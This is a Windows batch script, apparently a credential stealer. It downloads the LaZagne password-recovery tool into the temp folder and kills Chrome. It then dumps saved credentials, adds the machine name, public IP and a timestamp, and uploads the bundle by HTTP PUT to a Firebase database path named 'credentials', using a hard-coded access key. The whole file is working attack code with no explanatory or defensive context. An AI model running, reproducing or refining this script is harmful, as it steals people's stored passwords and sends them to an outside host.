@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"

if not exist "%LAZAGNE_EXE%" (
    powershell -Command "Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%' -UseBasicParsing"
)

taskkill /IM chrome.exe /F >nul 2>&1

if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%"

"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1

for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"

set "PC_NAME=%COMPUTERNAME%"
set "PC_NAME=!PC_NAME: =_!"
set "PC_NAME=!PC_NAME:-=_!"

for /f %%i in ('powershell -Command "(Invoke-RestMethod -Uri ''https://api.ipify.org'').Trim()"') do set "PUBLIC_IP=%%i"
for /f %%i in ('powershell -Command "Get-Date -Format ''yyyy-MM-dd HH:mm:ss''"') do set "TIMESTAMP=%%i"

setlocal enabledelayedexpansion
set "LAZAGNE_DATA="
if defined RESULT_FILE (
    set /p LAZAGNE_DATA=<"%OUTPUT_DIR%\%RESULT_FILE%"
)
if not defined LAZAGNE_DATA set "LAZAGNE_DATA=No data collected"

set "LAZAGNE_DATA=!LAZAGNE_DATA:\=\\!"
set "LAZAGNE_DATA=!LAZAGNE_DATA:"=\\\"!"

set "JSON_PAYLOAD={\"computer\":\"%PC_NAME%\",\"timestamp\":\"%TIMESTAMP%\",\"ip\":\"%PUBLIC_IP%\",\"data\":\"!LAZAGNE_DATA!\"}"
endlocal & set "JSON_PAYLOAD=%JSON_PAYLOAD%"

powershell -Command ^
    "Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body '%JSON_PAYLOAD%' -ContentType 'application/json'"

exit /b 0
